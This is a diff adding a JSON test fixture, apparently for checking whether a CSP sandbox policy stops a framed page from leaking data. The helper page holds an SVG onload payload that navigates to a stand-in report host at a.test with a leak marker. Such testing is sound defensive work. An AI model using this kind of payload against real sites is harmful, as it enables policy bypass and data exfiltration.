@@ -1,0 +1,16 @@
+```json
+{
+  "f1396320": {
+    "url_queue.txt": "https://leak.test/CSP/f1396320/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<iframe src=\"helper\"></iframe>",
+        "headers.json": "[\n  {\n    \"key\": \"Content-Security-Policy\",\n    \"value\": \"sandbox allow-scripts\"\n  }\n]"
+      },
+      "helper": {
+        "index.html": "<svg onload=\"document.location.href='https://a.test/report/?leak=f1396320'\"></svg>"
+      }
+    }
+  }
+}
+```
